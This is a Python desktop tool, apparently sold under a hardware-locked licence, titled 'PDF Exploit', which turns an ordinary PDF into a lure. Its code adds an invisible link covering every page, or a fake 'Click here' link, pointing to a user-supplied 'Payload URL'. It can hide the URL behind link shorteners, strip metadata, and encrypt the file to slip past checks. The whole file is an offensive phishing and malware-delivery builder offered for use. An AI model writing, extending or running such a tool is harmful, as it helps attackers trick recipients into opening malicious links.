import sys
import subprocess
import importlib
import os

# Auto-install missing packages
I2 = ['pypdf', 'cryptography', 'pyshorteners']

def I52(I70):
    print(f'Installing missing package: {I70}...')
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', I70])
    print(f'Restarting script after installing {I70}...')
    os.execv(sys.executable, [sys.executable] + sys.argv)

def I20():
    for I70 in I2:
        try:
            importlib.import_module(I70)
        except ImportError:
            I52(I70)

I20()

import tkinter as tk
from tkinter import filedialog, messagebox, ttk, font
import hashlib
import base64
import json
import platform
import subprocess
import uuid
import os
from datetime import datetime
from pypdf import PdfReader, PdfWriter
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject

try:
    import pyshorteners
    I3 = True
except ImportError:
    I3 = False


def I126():
    """Generate hardware ID based on system information"""
    system = platform.system()
    
    if system == "Windows":
        try:
            output = subprocess.check_output("wmic csproduct get uuid", shell=True)
            hwid = output.decode().split('\n')[1].strip()
        except:
            hwid = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0,2*6,2)][::-1])
    else:
        hwid = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
    
    return hashlib.sha256(hwid.encode()).hexdigest()


def I94(I62, I75='tinyurl'):
    if not I3:
        return (I62, 'pyshorteners not installed')
    I90 = ['tinyurl', 'isgd', 'clckru', 'dagd']
    for I89 in I90:
        try:
            I83 = pyshorteners.Shortener()
            if I89 == 'tinyurl':
                I92 = I83.tinyurl.short(I62)
            elif I89 == 'isgd':
                I92 = I83.isgd.short(I62)
            elif I89 == 'clckru':
                I92 = I83.clckru.short(I62)
            elif I89 == 'dagd':
                I92 = I83.dagd.short(I62)
            else:
                continue
            return (I92, None)
        except Exception as e:
            last_error = str(e)
    return (I62, f'All shorteners failed: {last_error}')


def I19(I118, I117, I49):
    I85 = I118.winfo_screenwidth()
    I84 = I118.winfo_screenheight()
    I120 = (I85 - I117) // 2
    I121 = (I84 - I49) // 2
    I118.geometry(f'{I117}x{I49}+{I120}+{I121}')


class I127:
    def __init__(I87, I82, I128):
        I87.root = I82
        I87.on_success = I128
        I82.title('Login Required')
        I82.configure(bg='#1a1a1a')
        I82.resizable(False, False)
        I19(I82, 400, 350)
        
        I87.license_file = 'license.inc'
        I87.current_hwid = I126()
        
        # Check if license is already saved
        if I87.check_saved_license():
            I87.root.destroy()
            I87.on_success()
        else:
            I87.I129()
    
    def check_saved_license(I87):
        if not os.path.exists(I87.license_file):
            return False
        
        try:
            with open(I87.license_file, 'r') as f:
                saved_data = json.load(f)
            
            saved_hwid = saved_data.get('hwid')
            saved_username = saved_data.get('username')
            saved_key = saved_data.get('license_key')
            saved_expiry = saved_data.get('expiry')
            
            # Verify HWID matches
            if saved_hwid != I87.current_hwid:
                return False
            
            # Verify the key is valid
            SECRET_SALT = "PDF_EXPLOIT_2026_SECRET_KEY_SALT"
            
            # Check expiry first
            if saved_expiry != 'lifetime':
                try:
                    expiry_date = datetime.strptime(saved_expiry, '%Y-%m-%d')
                    if datetime.now() > expiry_date:
                        os.remove(I87.license_file)
                        return False
                except:
                    return False
            
            # Regenerate expected key for all possible expiry values
            # Try with saved expiry
            expected_key_data = f"{SECRET_SALT}:{saved_hwid}:{saved_username}:{saved_expiry}"
            expected_key = hashlib.sha256(expected_key_data.encode()).hexdigest().upper()
            expected_formatted = '-'.join([expected_key[i:i+8] for i in range(0, 64, 8)])
            
            if saved_key == expected_formatted:
                return True
            
            return False
        except:
            return False
    
    def save_license(I87, username, license_key, expiry):
        license_data = {
            'hwid': I87.current_hwid,
            'username': username,
            'license_key': license_key,
            'expiry': expiry,
            'saved_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open(I87.license_file, 'w') as f:
            json.dump(license_data, f, indent=2)
        
    def I129(I87):
        title = tk.Label(I87.root, text='Hardware ID Login', 
                        font=('Segoe UI', 16, 'bold'),
                        fg='#ffffff', bg='#1a1a1a')
        title.pack(pady=20)
        
        frame = tk.Frame(I87.root, bg='#2a2a2a', bd=2, relief='groove')
        frame.pack(padx=30, pady=10, fill='both', expand=True)
        
        tk.Label(frame, text='Username:', fg='#ffffff', bg='#2a2a2a',
                font=('Segoe UI', 10)).pack(pady=(20, 5))
        I87.username_entry = tk.Entry(frame, font=('Segoe UI', 10), 
                                      bg='#3a3a3a', fg='#ffffff',
                                      insertbackground='#ffffff', bd=1)
        I87.username_entry.pack(pady=5, padx=20, fill='x')
        
        tk.Label(frame, text='License Key:', fg='#ffffff', bg='#2a2a2a',
                font=('Segoe UI', 10)).pack(pady=(10, 5))
        I87.key_entry = tk.Entry(frame, font=('Segoe UI', 10),
                                      bg='#3a3a3a', fg='#ffffff',
                                      insertbackground='#ffffff', bd=1)
        I87.key_entry.pack(pady=5, padx=20, fill='x')
        I87.key_entry.bind('<Return>', lambda e: I87.I130())
        
        hwid_frame = tk.Frame(frame, bg='#2a2a2a')
        hwid_frame.pack(pady=(15, 5))
        
        tk.Label(hwid_frame, text=f'HWID: {I87.current_hwid[:16]}...', 
                fg='#888888', bg='#2a2a2a',
                font=('Consolas', 8)).pack(side='left', padx=(0, 5))
        
        copy_btn = tk.Button(hwid_frame, text='Copy', command=I87.I132,
                           bg='#3a3a3a', fg='#ffffff', font=('Segoe UI', 7),
                           activebackground='#4a4a4a', activeforeground='#ffffff',
                           bd=0, padx=8, pady=2, cursor='hand2')
        copy_btn.pack(side='left')
        
        login_btn = tk.Button(frame, text='Login', command=I87.I130,
                            bg='#0d7377', fg='#ffffff', font=('Segoe UI', 10, 'bold'),
                            activebackground='#0f8a8e', activeforeground='#ffffff',
                            bd=0, padx=20, pady=8, cursor='hand2')
        login_btn.pack(pady=15)
        
        I87.status_label = tk.Label(I87.root, text='', fg='#ff6b6b', 
                                    bg='#1a1a1a', font=('Segoe UI', 9))
        I87.status_label.pack(pady=5)
    
    def I132(I87):
        I87.root.clipboard_clear()
        I87.root.clipboard_append(I87.current_hwid)
        I87.status_label.config(text='HWID copied to clipboard!', fg='#51cf66')
        
    def I130(I87):
        username = I87.username_entry.get().strip()
        license_key = I87.key_entry.get().strip()
        
        if not username or not license_key:
            I87.status_label.config(text='Please enter username and license key', fg='#ff6b6b')
            return
        
        # Secret salt must match keyganator.py
        SECRET_SALT = "PDF_EXPLOIT_2026_SECRET_KEY_SALT"
        
        # Try all possible expiry values to validate the key
        valid_key = False
        matched_expiry = None
        
        # Try lifetime first
        test_key_data = f"{SECRET_SALT}:{I87.current_hwid}:{username}:lifetime"
        test_key = hashlib.sha256(test_key_data.encode()).hexdigest().upper()
        test_formatted = '-'.join([test_key[i:i+8] for i in range(0, 64, 8)])
        
        if license_key == test_formatted:
            valid_key = True
            matched_expiry = "lifetime"
        else:
            # Try date-based expiry (check next 5 years of possible dates)
            from datetime import timedelta
            base_date = datetime.now()
            
            for days_offset in range(-365, 365*5):  # Check past year to 5 years future
                test_date = (base_date + timedelta(days=days_offset)).strftime('%Y-%m-%d')
                test_key_data = f"{SECRET_SALT}:{I87.current_hwid}:{username}:{test_date}"
                test_key = hashlib.sha256(test_key_data.encode()).hexdigest().upper()
                test_formatted = '-'.join([test_key[i:i+8] for i in range(0, 64, 8)])
                
                if license_key == test_formatted:
                    valid_key = True
                    matched_expiry = test_date
                    break
        
        if not valid_key:
            I87.status_label.config(text='Invalid license key', fg='#ff6b6b')
            messagebox.showerror('Access Denied', 
                               f'Invalid license key for this hardware.\n\nYour HWID:\n{I87.current_hwid}')
            return
        
        # Check if expired
        if matched_expiry != 'lifetime':
            try:
                expiry_date = datetime.strptime(matched_expiry, '%Y-%m-%d')
                if datetime.now() > expiry_date:
                    I87.status_label.config(text='License expired', fg='#ff6b6b')
                    messagebox.showerror('Access Denied', 
                                       f'License expired on {matched_expiry}')
                    return
            except:
                pass
        
        I87.status_label.config(text='Login successful!', fg='#51cf66')
        
        # Save license for future use
        I87.save_license(username, license_key, matched_expiry)
        
        messagebox.showinfo('Success', f'Welcome {username}!\n\nLicense saved. You won\'t need to login again.')
        I87.root.destroy()
        I87.on_success()


class I1:
    def __init__(I87, I82):
        I87.root = I82
        I82.title('PDF Exploit')
        I82.configure(bg='#1a1a1a')
        I82.resizable(True, True)
        I19(I82, 750, 650)

        I87.title_font = font.Font(family='Segoe UI', size=12, weight='bold')
        I87.head_font = font.Font(family='Segoe UI', size=10, weight='bold')
        I87.body_font = font.Font(family='Segoe UI', size=9)
        I87.code_font = font.Font(family='Consolas', size=9)

        I87.input_path = tk.StringVar()
        I87.output_path = tk.StringVar()
        I87.target_url = tk.StringVar()
        I87.password = tk.StringVar()
        I87.use_shortener = tk.BooleanVar(value=False)
        I87.remove_metadata = tk.BooleanVar(value=True)
        I87.invisible_link = tk.BooleanVar(value=True)
        I87.disguise_text = tk.BooleanVar(value=False)
        I87.add_delay_js = tk.BooleanVar(value=False)
        I87.shortener_service = tk.StringVar(value='tinyurl')
        I87.progress = tk.DoubleVar(value=0)

        I87.I91()   # Apply styling
        I87.I25()   # Build GUI
        I87.status.config(text='✓ Ready ')

    def I91(I87):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#1a1a1a')
        style.configure('TLabel', background='#1a1a1a', foreground='#ffffff')
        style.configure('TLabelframe', background='#1a1a1a', foreground='#ffffff', bordercolor='#3a3a3a')
        style.configure('TLabelframe.Label', background='#1a1a1a', foreground='#ffffff')
        style.configure('TCheckbutton', background='#1a1a1a', foreground='#ffffff', 
                       bordercolor='#3a3a3a', darkcolor='#1a1a1a', lightcolor='#1a1a1a')
        style.map('TCheckbutton',
                 background=[('active', '#1a1a1a'), ('selected', '#1a1a1a')],
                 foreground=[('active', '#ffffff')])
        style.configure('TButton', background='#3a3a3a', foreground='#ffffff', bordercolor='#555555', 
                       lightcolor='#4a4a4a', darkcolor='#2a2a2a')
        style.map('TButton',
                 background=[('active', '#4a4a4a'), ('pressed', '#2a2a2a')],
                 foreground=[('active', '#ffffff')])
        style.configure('Primary.TButton', background='#0d7377', foreground='#ffffff', 
                       bordercolor='#0a5a5d', lightcolor='#0f8a8e', darkcolor='#0a5a5d')
        style.map('Primary.TButton',
                 background=[('active', '#0f8a8e'), ('pressed', '#0a5a5d')],
                 foreground=[('active', '#ffffff')])
        style.configure('Danger.TButton', background='#c0392b', foreground='#ffffff',
                       bordercolor='#a02f23', lightcolor='#d44332', darkcolor='#a02f23')
        style.map('Danger.TButton',
                 background=[('active', '#d44332'), ('pressed', '#a02f23')],
                 foreground=[('active', '#ffffff')])
        style.configure('TEntry', fieldbackground='#2a2a2a', foreground='#ffffff', 
                       bordercolor='#3a3a3a', insertcolor='#ffffff')
        style.map('TEntry',
                 fieldbackground=[('focus', '#2a2a2a')],
                 foreground=[('focus', '#ffffff')])
        style.configure('TMenubutton', background='#2a2a2a', foreground='#ffffff', bordercolor='#3a3a3a')
        style.map('TMenubutton',
                 background=[('active', '#3a3a3a')],
                 foreground=[('active', '#ffffff')])

    def I25(I87):
        main = ttk.Frame(I87.root)
        main.pack(fill='both', expand=True, padx=20, pady=20)

        # Title
        title_frame = ttk.Frame(main)
        title_frame.pack(fill='x', pady=(0, 12))
        tk.Label(title_frame, text='PDF Exploit', font=I87.title_font, fg='#ffffff', bg='#1a1a1a').pack(side='left')
        tk.Label(title_frame, text='Embed clickable exploit links into every page', 
                fg='#cccccc', bg='#1a1a1a', font=I87.body_font).pack(side='left', padx=(10, 0))

        # File Selection
        file_frame = ttk.LabelFrame(main, text=' File Selection ')
        file_frame.pack(fill='x', pady=6)
        f = ttk.Frame(file_frame)
        f.pack(padx=12, pady=10, fill='x')

        ttk.Label(f, text='Input PDF:').grid(row=0, column=0, sticky='w', pady=4)
        ttk.Entry(f, textvariable=I87.input_path, width=55).grid(row=0, column=1, padx=5, pady=4)
        ttk.Button(f, text='Browse', command=I87.I15).grid(row=0, column=2, padx=4)

        ttk.Label(f, text='Output PDF:').grid(row=1, column=0, sticky='w', pady=4)
        ttk.Entry(f, textvariable=I87.output_path, width=55).grid(row=1, column=1, padx=5, pady=4)
        ttk.Button(f, text='Save As', command=I87.I16).grid(row=1, column=2, padx=4)

        # Payload URL
        url_frame = ttk.LabelFrame(main, text=' Payload URL ')
        url_frame.pack(fill='x', pady=6)
        u = ttk.Frame(url_frame)
        u.pack(padx=12, pady=10, fill='x')
        ttk.Label(u, text='Target URL (http:// or https://):').pack(anchor='w')
        url_entry_frame = ttk.Frame(u)
        url_entry_frame.pack(fill='x', pady=4)
        ttk.Entry(url_entry_frame, textvariable=I87.target_url, width=65).pack(side='left', fill='x', expand=True)
        ttk.Button(url_entry_frame, text='Paste Link', command=I87.I124).pack(side='left', padx=(5, 0))
        ttk.Button(url_entry_frame, text='Clear', command=I87.I125).pack(side='left', padx=(3, 0))

        # Options
        opt_frame = ttk.LabelFrame(main, text=' Exploit Options ')
        opt_frame.pack(fill='both', pady=6)
        o = ttk.Frame(opt_frame)
        o.pack(padx=12, pady=10, fill='both', expand=True)

        left = ttk.Frame(o)
        left.pack(side='left', fill='both', expand=True, padx=(0, 12))

        ttk.Checkbutton(left, text='Use URL shortener', variable=I87.use_shortener, 
                       command=I87.I108).pack(anchor='w', pady=4)
        I87.shortener_menu = ttk.OptionMenu(left, I87.shortener_service, 'tinyurl', 
                                          'tinyurl', 'isgd', 'clckru', 'dagd')
        I87.shortener_menu.pack(anchor='w', padx=18, pady=4)

        ttk.Checkbutton(left, text='Remove all metadata', variable=I87.remove_metadata).pack(anchor='w', pady=4)
        ttk.Checkbutton(left, text='Invisible full-page link', variable=I87.invisible_link).pack(anchor='w', pady=4)

        right = ttk.Frame(o)
        right.pack(side='right', fill='both', expand=True)
        ttk.Checkbutton(right, text='Disguise as \'Click here\' text', variable=I87.disguise_text).pack(anchor='w', pady=4)
        ttk.Checkbutton(right, text='JavaScript delay (Adobe only)', variable=I87.add_delay_js).pack(anchor='w', pady=4)

        # Password
        pw_frame = ttk.Frame(o)
        pw_frame.pack(fill='x', pady=(10, 0))
        ttk.Label(pw_frame, text='Password:').pack(side='left')
        ttk.Entry(pw_frame, textvariable=I87.password, show='*', width=22).pack(side='left', padx=10)

        # Progress & Buttons
        I87.progress_bar = ttk.Progressbar(main, variable=I87.progress, maximum=100)
        I87.progress_bar.pack(fill='x', pady=(12, 6))

        btn_frame = ttk.Frame(main)
        btn_frame.pack(fill='x', pady=10)

        ttk.Button(btn_frame, text='Generate PDF', command=I87.I43, style='Primary.TButton').pack(side='left', padx=4)
        ttk.Button(btn_frame, text='Clear', command=I87.I23).pack(side='left', padx=4)
        ttk.Button(btn_frame, text='Exit', command=I87.root.quit, style='Danger.TButton').pack(side='left', padx=4)

        I87.status = tk.Label(I87.root, text='✓ Ready', fg='#ffffff', bg='#1a1a1a', anchor='w')
        I87.status.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=12)

    def I108(I87):
        state = 'normal' if I87.use_shortener.get() else 'disabled'
        I87.shortener_menu.config(state=state)

    def I124(I87):
        try:
            clipboard_text = I87.root.clipboard_get()
            I87.target_url.set(clipboard_text)
            I87.status.config(text='✓ Link pasted from clipboard')
        except:
            messagebox.showwarning('Clipboard', 'No text found in clipboard')

    def I125(I87):
        I87.target_url.set('')
        I87.status.config(text='✓ URL cleared')

    def I15(I87):
        path = filedialog.askopenfilename(filetypes=[('PDF files', '*.pdf')])
        if path:
            I87.input_path.set(path)
            base = os.path.splitext(path)[0]
            I87.output_path.set(f'{base}_exploit.pdf')

    def I16(I87):
        path = filedialog.asksaveasfilename(defaultextension='.pdf', filetypes=[('PDF files', '*.pdf')])
        if path:
            I87.output_path.set(path)

    def I23(I87):
        I87.input_path.set('')
        I87.output_path.set('')
        I87.target_url.set('')
        I87.password.set('')
        I87.use_shortener.set(False)
        I87.remove_metadata.set(True)
        I87.invisible_link.set(True)
        I87.disguise_text.set(False)
        I87.add_delay_js.set(False)
        I87.shortener_service.set('tinyurl')
        I87.I108()
        I87.progress.set(0)
        I87.status.config(text='✓ Fields cleared')

    def I43(I87):
        if not I87.input_path.get() or not os.path.exists(I87.input_path.get()):
            messagebox.showerror('Error', 'Please select a valid input PDF.')
            return
        if not I87.output_path.get():
            messagebox.showerror('Error', 'Please specify an output path.')
            return
        if not I87.target_url.get().startswith(('http://', 'https://')):
            messagebox.showerror('Error', 'Please enter a valid URL.')
            return

        url = I87.target_url.get()

        if I87.use_shortener.get():
            I87.status.config(text='⏳ Shortening URL...')
            I87.root.update()
            short_url, err = I94(url)
            if err:
                messagebox.showwarning('Shortener', f'{err}\n\nUsing original URL.')
            else:
                url = short_url
                I87.status.config(text='✓ URL shortened')

        I87.status.config(text='⏳ Injecting exploit link into PDF...')
        I87.progress.set(20)
        I87.root.update()

        try:
            reader = PdfReader(I87.input_path.get())
            writer = PdfWriter()

            for page in reader.pages:
                writer.add_page(page)

            for i, page in enumerate(writer.pages):
                width = float(page.mediabox.width)
                height = float(page.mediabox.height)

                if I87.disguise_text.get():
                    rect = (width - 150, 20, width - 20, 50)
                else:
                    rect = (0, 0, width, height)

                uri = DictionaryObject({
                    NameObject('/S'): NameObject('/URI'),
                    NameObject('/URI'): TextStringObject(url)
                })

                annot = DictionaryObject({
                    NameObject('/Type'): NameObject('/Annot'),
                    NameObject('/Subtype'): NameObject('/Link'),
                    NameObject('/Rect'): ArrayObject([
                        NumberObject(rect[0]),
                        NumberObject(rect[1]),
                        NumberObject(rect[2]),
                        NumberObject(rect[3])
                    ]),
                    NameObject('/A'): uri,
                    NameObject('/Border'): ArrayObject([NumberObject(0), NumberObject(0), NumberObject(0)])
                })

                if '/Annots' not in page:
                    page[NameObject('/Annots')] = ArrayObject()
                page[NameObject('/Annots')].append(annot)

                I87.progress.set(40 + int(50 * i / len(writer.pages)))
                I87.root.update_idletasks()

            if I87.remove_metadata.get():
                writer.add_metadata({})

            if I87.password.get().strip():
                writer.encrypt(I87.password.get().strip())

            with open(I87.output_path.get(), 'wb') as f:
                writer.write(f)

            I87.progress.set(100)
            I87.status.config(text='✓ Exploit PDF successfully created!')
            messagebox.showinfo('Success', 
                f'Exploit PDF saved to:\n{I87.output_path.get()}\n\nURL: {url}')

        except Exception as e:
            I87.status.config(text='✗ Error')
            messagebox.showerror('Error', str(e))


if __name__ == '__main__':
    def I131():
        root = tk.Tk()
        app = I1(root)
        root.mainloop()
    
    login_root = tk.Tk()
    login_app = I127(login_root, I131)
    login_root.mainloop()